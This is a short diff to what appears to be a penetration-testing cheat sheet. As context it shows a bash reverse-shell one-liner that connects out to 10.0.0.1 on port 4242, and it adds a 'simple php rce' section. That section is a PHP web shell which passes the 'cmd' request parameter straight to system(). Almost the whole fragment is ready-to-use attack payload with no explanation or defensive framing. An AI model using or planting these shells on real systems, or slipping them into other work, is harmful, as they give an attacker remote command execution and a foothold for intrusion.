@@ -23,6 +23,15 @@ and try them out on target machine
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 ```
+
+### simple php rce
+```php
+<?php
+echo("Hello there!");
+system($_REQUEST['cmd']);
+?>
+```
+
 ## ENCODING STUFF
 
 ### replace bad char
